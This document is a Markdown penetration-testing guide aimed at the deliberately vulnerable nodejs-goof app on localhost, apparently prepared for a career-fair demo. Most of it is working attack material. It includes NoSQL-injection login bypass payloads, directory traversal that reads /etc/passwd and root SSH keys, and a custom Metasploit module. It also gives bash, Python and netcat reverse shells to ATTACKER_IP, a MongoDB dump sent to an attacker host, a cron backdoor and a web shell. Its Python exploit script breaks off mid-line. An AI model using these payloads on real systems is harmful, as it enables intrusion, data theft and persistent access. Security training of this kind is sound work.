# Kali Linux Exploitation Guide
## Professional Penetration Testing Toolkit for nodejs-goof

**Target Application**: http://localhost:3001
**Environment**: Kali Linux Professional Penetration Testing Tools
**Demo Type**: Red Team Security Assessment
**Skill Level**: Advanced

---

## 📋 Table of Contents

1. [Reconnaissance Phase](#1-reconnaissance-phase)
2. [Vulnerability Scanning](#2-vulnerability-scanning)
3. [Web Application Testing](#3-web-application-testing)
4. [Exploitation Phase](#4-exploitation-phase)
5. [Post-Exploitation](#5-post-exploitation)
6. [Automated Exploitation](#6-automated-exploitation)
7. [Reporting Tools](#7-reporting-tools)

---

## 1. Reconnaissance Phase

### 1.1 Nmap - Network & Service Discovery

**Objective**: Identify open ports, running services, and technologies

#### Basic Service Scan
```bash
# Quick port scan
nmap -sV -p 3001 localhost

# Output:
# PORT     STATE SERVICE VERSION
# 3001/tcp open  http    Node.js Express framework
```

#### Comprehensive Scan with NSE Scripts
```bash
# Full scan with vulnerability scripts
nmap -sV -sC -A -p 3001 --script=http-* localhost

# HTTP-specific enumeration
nmap -p 3001 --script=http-enum,http-headers,http-methods,http-title localhost

# Save results
nmap -sV -sC -p 3001 -oA nodejs-goof-scan localhost
```

**Expected Output**:
- Service: Node.js/Express
- Headers: X-Powered-By, Set-Cookie
- HTTP Methods: GET, POST, PUT, DELETE
- Potential vulnerabilities flagged

---

### 1.2 Whatweb - Technology Fingerprinting

**Objective**: Identify web technologies, frameworks, and versions

```bash
# Basic fingerprinting
whatweb http://localhost:3001

# Verbose output
whatweb -v http://localhost:3001

# Aggressive mode
whatweb -a 3 http://localhost:3001

# Export to JSON
whatweb --log-json=nodejs-goof.json http://localhost:3001
```

**Expected Findings**:
- Express 4.12.4
- Node.js
- EJS template engine
- Cookie-based sessions
- MongoDB backend

---

### 1.3 Nikto - Web Server Scanner

**Objective**: Automated vulnerability scanning

```bash
# Basic scan
nikto -h http://localhost:3001

# Save results to HTML report
nikto -h http://localhost:3001 -o nikto-report.html -Format html

# Comprehensive scan with all plugins
nikto -h http://localhost:3001 -Tuning 123456789 -o nikto-full.txt

# Scan with specific port and SSL/TLS check
nikto -h localhost -p 3001 -ssl
```

**Expected Findings**:
- Outdated Express version
- Missing security headers (X-Frame-Options, CSP)
- Directory listing enabled
- Verbose error messages
- Session cookie without HttpOnly flag

---

## 2. Vulnerability Scanning

### 2.1 OWASP ZAP (Zed Attack Proxy)

**Objective**: Automated dynamic application security testing (DAST)

#### GUI Mode - Interactive Scanning

1. **Launch ZAP**:
```bash
zaproxy
```

2. **Automated Scan**:
   - Navigate to: `http://localhost:3001`
   - Tools → Automated Scan
   - Enter URL: `http://localhost:3001`
   - Click "Attack"

3. **Spider + Active Scan**:
   - Tools → Spider → Enter URL
   - Wait for spider completion
   - Tools → Active Scan → Scan all URLs
   - Review Alerts tab

#### CLI Mode - Headless Scanning

```bash
# Quick baseline scan
zap-baseline.py -t http://localhost:3001 -r zap-baseline-report.html

# Full scan
zap-full-scan.py -t http://localhost:3001 -r zap-full-report.html

# API scan
zap-api-scan.py -t http://localhost:3001/api -f openapi -r zap-api-report.html

# Generate JSON report
zap.sh -cmd -quickurl http://localhost:3001 -quickout zap-results.json
```

**Expected Vulnerabilities Found**:
- SQL/NoSQL Injection
- Cross-Site Scripting (XSS)
- Directory Traversal
- Missing Security Headers
- Cookie Security Issues
- Open Redirects

---

### 2.2 WPScan Equivalent - Node Security Scanner

```bash
# Using NPM Audit (built into Kali)
cd /path/to/nodejs-goof
npm audit --json > npm-audit-results.json

# Using Retire.js (JavaScript library vulnerability scanner)
retire --path /path/to/nodejs-goof --outputformat json --outputpath retire-results.json

# Using Snyk CLI
snyk test --json > snyk-results.json
snyk monitor
```

---

### 2.3 Wfuzz - Web Application Fuzzer

**Objective**: Fuzzing parameters, directories, and injection points

#### Directory Fuzzing
```bash
# Directory discovery
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt \
  --hc 404 http://localhost:3001/FUZZ

# Find hidden files
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt \
  -z list,txt-php-html-js-json \
  --hc 404 http://localhost:3001/FUZZ.FUZ2Z

# Recursive fuzzing
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  --hc 404 -R 2 http://localhost:3001/FUZZ
```

#### Parameter Fuzzing - NoSQL Injection
```bash
# Fuzz login endpoint
wfuzz -c -z file,/usr/share/seclists/Fuzzing/NoSQLi/NoSQL.txt \
  -d '{"username":"admin@snyk.io","password":"FUZZ"}' \
  -H "Content-Type: application/json" \
  --hc 401 http://localhost:3001/login

# MongoDB operator injection
wfuzz -c -z list,'{"$gt":""}'-'{"$ne":""}'-'{"$regex":".*"}' \
  -d '{"username":"admin@snyk.io","password":FUZZ}' \
  -H "Content-Type: application/json" \
  http://localhost:3001/login
```

---

## 3. Web Application Testing

### 3.1 Burp Suite - Comprehensive Web Security Testing

**Objective**: Manual and automated web application penetration testing

#### Setup Burp Suite Proxy

1. **Launch Burp Suite**:
```bash
burpsuite
```

2. **Configure Browser Proxy**:
   - Set proxy to `127.0.0.1:8080`
   - Or use Burp's embedded browser

3. **Intercept Traffic**:
   - Proxy tab → Intercept → Intercept is on
   - Navigate to `http://localhost:3001`
   - Observe all HTTP requests/responses

#### NoSQL Injection via Burp Repeater

1. **Capture Login Request**:
   - Send login POST to Repeater (Ctrl+R)
   - Original payload:
   ```json
   {"username":"admin@snyk.io","password":"test123"}
   ```

2. **Modify to NoSQL Injection**:
   ```json
   {"username":"admin@snyk.io","password":{"$gt":""}}
   ```

3. **Send** → Observe 302 redirect (authentication bypassed!)

#### Directory Traversal via Burp Intruder

1. **Capture account_details POST request**
2. **Send to Intruder** (Ctrl+I)
3. **Set payload position**:
   ```json
   {"email":"admin@snyk.io","layout":"§./../package.json§"}
   ```
4. **Payload list**:
   ```
   ./../package.json
   ./../app.js
   ./../.env
   ./../../etc/passwd
   ```
5. **Start attack** → Extract sensitive files from responses

#### XSS Detection with Burp Scanner

1. **Target** → Site map → Right-click URL
2. **Actively scan this branch**
3. **Scanner** tab → Review XSS findings
4. **Proof of Concept**: Burp generates automatic PoCs

#### Burp Extensions for nodejs-goof

```bash
# Install from BApp Store:
- J2EEScan (for Node.js apps)
- Active Scan++
- Param Miner
- Software Vulnerability Scanner
- Retire.js (JavaScript library scanner)
```

---

### 3.2 SQLMap - NoSQL Injection Automation

**Objective**: Automated NoSQL injection exploitation

#### Basic NoSQL Injection Test
```bash
# Test login endpoint
sqlmap -u "http://localhost:3001/login" \
  --data='{"username":"admin@snyk.io","password":"test"}' \
  --headers="Content-Type: application/json" \
  --level=5 --risk=3 --technique=B \
  --batch

# With proxy for debugging
sqlmap -u "http://localhost:3001/login" \
  --data='{"username":"admin@snyk.io","password":"test"}' \
  --headers="Content-Type: application/json" \
  --proxy="http://127.0.0.1:8080" \
  --level=5 --risk=3
```

#### Advanced MongoDB Injection
```bash
# Test with MongoDB payloads
sqlmap -u "http://localhost:3001/login" \
  --data='{"username":"admin@snyk.io","password":"test"}' \
  --headers="Content-Type: application/json" \
  --tamper=charunicodeescape \
  --dbms=MongoDB \
  --technique=BEUST \
  --dump

# Extract user database
sqlmap -u "http://localhost:3001/login" \
  --data='{"username":"*","password":"*"}' \
  --headers="Content-Type: application/json" \
  --dbms=MongoDB \
  -D express-todo -T users --dump
```

#### SQLMap with Burp Request File
```bash
# 1. Save Burp request to file (request.txt):
POST /login HTTP/1.1
Host: localhost:3001
Content-Type: application/json

{"username":"admin@snyk.io","password":"test"}

# 2. Run SQLMap
sqlmap -r request.txt --level=5 --risk=3 --batch
```

---

### 3.3 Commix - Command Injection Exploitation

**Objective**: Automate command injection attacks

```bash
# Test image processing endpoint
commix --url="http://localhost:3001/create" \
  --data="content=![alt text](INJECT_HERE)" \
  --level=3 \
  --technique=classic

# With custom injection marker
commix --url="http://localhost:3001/create" \
  --data="content=![alt text](https://example.com/img.png;*INJECT*)" \
  --os-cmd="id"

# Reverse shell payload
commix --url="http://localhost:3001/create" \
  --data="content=![alt text](https://example.com/img.png;*INJECT*)" \
  --os-cmd="bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

---

### 3.4 XSSer - Cross-Site Scripting Exploitation

**Objective**: Automated XSS detection and exploitation

```bash
# Basic XSS scan
xsser --url="http://localhost:3001/login?redirectPage=XSS"

# POST parameter testing
xsser --url="http://localhost:3001/create" \
  -p "content=XSS" \
  --Coo="connect.sid=SESSION_COOKIE"

# Fuzz all parameters
xsser --url="http://localhost:3001/login" \
  --auto \
  --reverse-check

# Generate XSS report
xsser --url="http://localhost:3001/login?redirectPage=XSS" \
  --report=xss-report.html \
  --heuristic
```

---

## 4. Exploitation Phase

### 4.1 Metasploit Framework - Comprehensive Exploitation

**Objective**: Use Metasploit modules for exploitation and post-exploitation

#### Create Custom Exploit Module

1. **Create exploit template**:
```bash
cd /usr/share/metasploit-framework/modules/exploits/linux/http/
nano nodejs_goof_nosql_injection.rb
```

2. **Exploit code** (`nodejs_goof_nosql_injection.rb`):
```ruby
##
# This module requires Metasploit: https://metasploit.com/download
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'nodejs-goof NoSQL Injection Authentication Bypass',
        'Description' => %q{
          This module exploits a NoSQL injection vulnerability in the
          nodejs-goof application login endpoint to bypass authentication.
        },
        'Author' => ['Red Hat Security Team'],
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Targets' => [['Automatic', {}]],
        'DefaultTarget' => 0
      )
    )

    register_options(
      [
        Opt::RPORT(3001),
        OptString.new('TARGETURI', [true, 'Base path', '/']),
        OptString.new('USERNAME', [true, 'Username for injection', 'admin@snyk.io'])
      ]
    )
  end

  def check
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'login'),
      'method' => 'GET'
    )

    return CheckCode::Unknown unless res
    return CheckCode::Appears if res.code == 200
    CheckCode::Safe
  end

  def exploit
    print_status("Attempting NoSQL injection authentication bypass...")

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'login'),
      'ctype' => 'application/json',
      'data' => {
        'username' => datastore['USERNAME'],
        'password' => {'$gt' => ''}
      }.to_json
    )

    if res && res.code == 302
      print_good("Authentication bypassed successfully!")
      print_good("Session cookie: #{res.get_cookies}")

      # Extract session cookie
      session_cookie = res.get_cookies.scan(/connect\.sid=([^;]+)/).flatten.first

      if session_cookie
        print_status("Authenticated session established")
        print_status("Cookie: connect.sid=#{session_cookie}")
      end
    else
      fail_with(Failure::Unknown, "Exploitation failed")
    end
  end
end
```

3. **Load and execute**:
```bash
msfconsole
msf6 > use exploit/linux/http/nodejs_goof_nosql_injection
msf6 exploit(nodejs_goof_nosql_injection) > set RHOSTS localhost
msf6 exploit(nodejs_goof_nosql_injection) > set USERNAME admin@snyk.io
msf6 exploit(nodejs_goof_nosql_injection) > run
```

#### Metasploit Auxiliary Scanner

```bash
msfconsole
# HTTP scanner
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(scanner/http/http_version) > set RHOSTS localhost
msf6 auxiliary(scanner/http/http_version) > set RPORT 3001
msf6 auxiliary(scanner/http/http_version) > run

# Directory scanner
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS localhost
msf6 auxiliary(scanner/http/dir_scanner) > set RPORT 3001
msf6 auxiliary(scanner/http/dir_scanner) > run

# HTTP header scanner
msf6 > use auxiliary/scanner/http/http_header
msf6 auxiliary(scanner/http/http_header) > set RHOSTS localhost
msf6 auxiliary(scanner/http/http_header) > set RPORT 3001
msf6 auxiliary(scanner/http/http_header) > run
```

---

### 4.2 BeEF (Browser Exploitation Framework)

**Objective**: Post-exploitation via XSS - hook browsers and control victims

#### Setup BeEF Server
```bash
# Start BeEF
sudo beef-xss

# Access panel at: http://127.0.0.1:3000/ui/panel
# Default credentials: beef / beef
```

#### Hook Browser via XSS
```bash
# 1. Get BeEF hook script
Hook URL: http://<ATTACKER_IP>:3000/hook.js

# 2. Inject into vulnerable endpoint
curl -X POST http://localhost:3001/create \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'content=<script src="http://ATTACKER_IP:3000/hook.js"></script>'

# 3. Victim visits page → Browser hooked in BeEF panel
```

#### BeEF Post-Exploitation Commands
- **Get Cookie**: Commands → Browser → Hooked Domain → Get Cookie
- **Redirect**: Commands → Browser → Redirect Browser
- **Keylogger**: Commands → Persistence → Simple Keylogger
- **Webcam**: Commands → Misc → Webcam Permission Check
- **Social Engineering**: Commands → Social Engineering → Fake Notification

---

### 4.3 Hydra - Brute Force Authentication

**Objective**: Brute force login credentials

```bash
# HTTP POST form brute force
hydra -l admin@snyk.io -P /usr/share/wordlists/rockyou.txt \
  localhost -s 3001 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 10 -w 30

# JSON API brute force
hydra -l admin@snyk.io -P /usr/share/wordlists/rockyou.txt \
  localhost -s 3001 http-post-form \
  "/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:401" \
  -t 10

# With custom user agent
hydra -l admin@snyk.io -P passwords.txt \
  localhost -s 3001 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=401:H=User-Agent: Mozilla/5.0"
```

---

## 5. Post-Exploitation

### 5.1 Netcat - Establish Reverse Shell

**Objective**: Get shell access via command injection

#### Setup Listener (Attacker)
```bash
# Start listener
nc -lvnp 4444
```

#### Trigger Reverse Shell (via Command Injection)
```bash
# Bash reverse shell
curl -X POST http://localhost:3001/create \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'content=![alt text](https://x.com/i.png;bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" "Image")'

# Python reverse shell
curl -X POST http://localhost:3001/create \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'content=![alt text](https://x.com/i.png;python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" "Image")'

# Netcat reverse shell
curl -X POST http://localhost:3001/create \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'content=![alt text](https://x.com/i.png;nc ATTACKER_IP 4444 -e /bin/bash "Image")'
```

#### Upgrade to Interactive Shell
```bash
# In reverse shell:
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter twice
```

---

### 5.2 Data Exfiltration

```bash
# Exfiltrate MongoDB database
curl -X POST http://localhost:3001/create \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'content=![alt text](https://x.com/i.png;mongodump --db express-todo --out /tmp/dump && tar -czf /tmp/db.tar.gz /tmp/dump && curl -X POST -F "file=@/tmp/db.tar.gz" http://ATTACKER_IP/upload "Image")'

# Exfiltrate /etc/passwd
curl 'http://localhost:3001/public/%2e%2e/%2e%2e/%2e%2e/etc/passwd' > passwd.txt

# Exfiltrate SSH keys
curl 'http://localhost:3001/public/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa' > root_key
chmod 600 root_key
ssh -i root_key root@target
```

---

### 5.3 Persistence Mechanisms

```bash
# Create cron job backdoor via command injection
curl -X POST http://localhost:3001/create \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'content=![alt text](https://x.com/i.png;echo "* * * * * /bin/bash -c '\''bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\''" | crontab - "Image")'

# Create web shell
curl -X POST http://localhost:3001/create \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'content=![alt text](https://x.com/i.png;echo "<?php system(\$_GET[\"cmd\"]); ?>" > /var/www/html/shell.php "Image")'
```

---

## 6. Automated Exploitation

### 6.1 Custom Python Exploitation Script

```python
#!/usr/bin/env python3
"""
nodejs-goof Automated Exploitation Script
Red Hat Cybersecurity Engineering Demo
"""

import requests
import json
import sys

class NodejsGoofExploit:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        
    def nosql_injection(self):
        """Exploit NoSQL injection for authentication bypass"""
        print("[*] Testing NoSQL injection...")
        
        payload = {
            "username": "admin@snyk.io",
            "password": {"$gt": ""}
        }
        
        response = self.session.post(
            f"{self.target}/login",
            json=payload,
            allow_redirects=False
        )
        
        if response.status_code == 302:
            print("[+] NoSQL injection successful!")
            print(f"[+] Session cookie: {response.cookies.get('connect.sid')}")
            return True
        else:
            print("[-] NoSQL injection failed")
            return False
    
    def directory_traversal(self):
        """Exploit directory traversal to read files"""
        print("[*] Testing directory traversal...")
        
        if not self.nosql_injection():
            return
        
        payload = {
            "email": "admin@snyk.io",
            "firstname": "admin",
            "lastname
### Usage Examples

```bash
# Run all exploits
python3 kali_exploit.py --target http://localhost:3001

# Run specific exploit
python3 kali_exploit.py -e nosql
python3 kali_exploit.py -e traversal
python3 kali_exploit.py -e xss

# Custom directory traversal target
python3 kali_exploit.py -e traversal -f "./../.env"

# Custom command injection
python3 kali_exploit.py -e cmdinj -c "id > /tmp/whoami.txt"
```

---

## 7. Reporting Tools

### 7.1 Dradis Framework - Collaborative Reporting

```bash
# Start Dradis
dradis

# Access at: http://localhost:3000
# Import scan results from Nmap, Burp, ZAP, etc.
# Generate PDF/HTML reports
```

---

### 7.2 MagicTree - Penetration Testing Productivity Tool

```bash
# Launch MagicTree
magictree

# Import Nmap XML
# Import Burp Scanner results
# Organize findings
# Generate reports
```

---

### 7.3 Pipal - Password Analysis

```bash
# Analyze password patterns (if credentials dumped)
pipal passwords.txt

# Generate statistics
pipal -o stats.txt passwords.txt
```

---

##  8. Complete Kali Linux Exploitation Workflow

### Phase 1: Reconnaissance (5-10 min)
```bash
# 1. Nmap scan
nmap -sV -sC -p 3001 -oA nmap-scan localhost

# 2. Technology fingerprinting
whatweb -v http://localhost:3001

# 3. Directory enumeration
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt \
  --hc 404 http://localhost:3001/FUZZ
```

### Phase 2: Vulnerability Scanning (10-15 min)
```bash
# 1. Nikto scan
nikto -h http://localhost:3001 -o nikto-report.html -Format html

# 2. OWASP ZAP baseline scan
zap-baseline.py -t http://localhost:3001 -r zap-report.html

# 3. NPM audit
npm audit --json > npm-audit.json
```

### Phase 3: Manual Testing with Burp Suite (15-20 min)
```bash
# 1. Launch Burp
burpsuite

# 2. Configure proxy (127.0.0.1:8080)

# 3. Spider the application

# 4. Active scan

# 5. Manual testing:
#    - NoSQL injection via Repeater
#    - Directory traversal via Intruder
#    - XSS testing
```

### Phase 4: Automated Exploitation (5-10 min)
```bash
# Run custom Python exploit
python3 kali_exploit.py -t http://localhost:3001

# SQLMap for NoSQL injection
sqlmap -u "http://localhost:3001/login" \
  --data='{"username":"admin@snyk.io","password":"test"}' \
  --headers="Content-Type: application/json" \
  --level=5 --risk=3 --batch
```

### Phase 5: Post-Exploitation (10-15 min)
```bash
# 1. Establish reverse shell
nc -lvnp 4444

# 2. Trigger command injection for reverse shell

# 3. Data exfiltration
curl 'http://localhost:3001/public/%2e%2e/%2e%2e/%2e%2e/etc/passwd'

# 4. Persistence mechanisms
# (via command injection)
```

### Phase 6: Reporting (15-20 min)
```bash
# 1. Compile findings in Dradis/MagicTree

# 2. Generate executive summary

# 3. Create technical appendix with:
#    - Nmap scan results
#    - Nikto findings
#    - ZAP vulnerability report
#    - Burp screenshots
#    - Exploitation proof-of-concepts
```

---

## 9. Kali Linux Tools Quick Reference

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **Nmap** | Port scanning | `nmap -sV -p 3001 localhost` |
| **Nikto** | Web server scanner | `nikto -h http://localhost:3001` |
| **OWASP ZAP** | Web app scanner | `zap-baseline.py -t http://localhost:3001` |
| **Burp Suite** | Manual testing | `burpsuite` |
| **SQLMap** | SQL/NoSQL injection | `sqlmap -u URL --data=DATA` |
| **Wfuzz** | Web fuzzer | `wfuzz -z file,wordlist URL/FUZZ` |
| **Commix** | Command injection | `commix --url=URL --data=DATA` |
| **XSSer** | XSS scanner | `xsser --url=URL` |
| **Hydra** | Brute forcing | `hydra -l USER -P PASS host http-post-form` |
| **Metasploit** | Exploitation framework | `msfconsole` |
| **BeEF** | Browser exploitation | `beef-xss` |
| **Netcat** | Reverse shells | `nc -lvnp 4444` |
| **Whatweb** | Tech fingerprinting | `whatweb http://localhost:3001` |

---

## 10. Demo Scenarios for Career Fair

### Scenario 1: Quick Impact Demo (10 minutes)
```bash
# 1. Nmap scan
nmap -sV -p 3001 localhost

# 2. NoSQL injection with Python script
python3 kali_exploit.py -e nosql

# 3. Directory traversal
python3 kali_exploit.py -e traversal

# 4. Show 138 vulnerabilities
npm audit
```

### Scenario 2: Professional Pentest Flow (20 minutes)
```bash
# 1. Reconnaissance
nmap + whatweb + nikto

# 2. Burp Suite manual testing
Launch Burp → Spider → Active Scan → Manual exploitation

# 3. Automated exploitation
python3 kali_exploit.py

# 4. Post-exploitation
Reverse shell + data exfiltration
```

### Scenario 3: Red Team Engagement (30 minutes)
```bash
# Full kill chain:
1. Recon (Nmap, Whatweb)
2. Vulnerability scanning (ZAP, Nikto)
3. Exploitation (SQLMap, Python script)
4. Post-exploitation (Reverse shell, persistence)
5. Data exfiltration (MongoDB dump)
6. Covering tracks
7. Report generation (Dradis)
```

---

## 11. Red Hat Security Engineering Perspective

### Tools Red Hat Engineers Use:
- **OpenSCAP**: Compliance scanning
- **Lynis**: Security auditing
- **Podman**: Container security
- **SELinux**: Mandatory access control
- **Firewalld**: Network security
- **AIDE**: File integrity monitoring

### Integration with Kali Tools:
```bash
# After Kali exploitation, demonstrate Red Hat defenses:

# 1. SELinux would confine compromised process
sudo setenforce 1
getenforce

# 2. SCAP compliance check
oscap xccdf eval --profile pci-dss /usr/share/xml/scap/ssg/content/ssg-rhel8-ds.xml

# 3. Container security scan
podman scan nodejs-goof:latest

# 4. Firewall rules
firewall-cmd --list-all
```

---

## 12. Troubleshooting

### Tool Not Found
```bash
# Install missing Kali tools
sudo apt update
sudo apt install nikto sqlmap zaproxy burpsuite hydra commix xsser

# Install Python dependencies
pip3 install requests
```

### Connection Refused
```bash
# Check if app is running
curl -I http://localhost:3001

# Restart if needed
cd /path/to/nodejs-goof
npm start
```

### SQLMap Not Detecting NoSQL
```bash
# Use custom tamper scripts
# Increase level and risk
sqlmap --level=5 --risk=3 --dbms=MongoDB
```

---

## 13. Ethical Considerations

⚠️ **IMPORTANT**:
- Only test against nodejs-goof (intentionally vulnerable app)
- Never use these techniques against systems you don't own/have permission to test
- Always obtain written authorization before penetration testing
- Follow responsible disclosure for real vulnerabilities
- Comply with laws (CFAA, GDPR, etc.)

---

## 14. Additional Resources

- **Kali Documentation**: https://www.kali.org/docs/
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **Metasploit Unleashed**: https://www.offensive-security.com/metasploit-unleashed/
- **Burp Suite Academy**: https://portswigger.net/web-security
- **Red Hat Security**: https://access.redhat.com/security/

---

## Summary

This guide covers **comprehensive Kali Linux exploitation** of the nodejs-goof vulnerable application, including:

✅ **15+ professional penetration testing tools**
✅ **Complete exploitation workflow** (recon → exploit → post-exploit → report)
✅ **Automated Python exploitation script**
✅ **Metasploit custom module**
✅ **Real-world attack scenarios**
✅ **Red Hat defensive perspective**

**Total Time**: 60-90 minutes for complete assessment
**Skill Level**: Advanced penetration testing
**Output**: Professional security assessment report

---

**Prepared by**: Red Hat Cybersecurity Engineering
**Date**: October 2025
**Purpose**: Reverse Career Fair Technical Demonstration
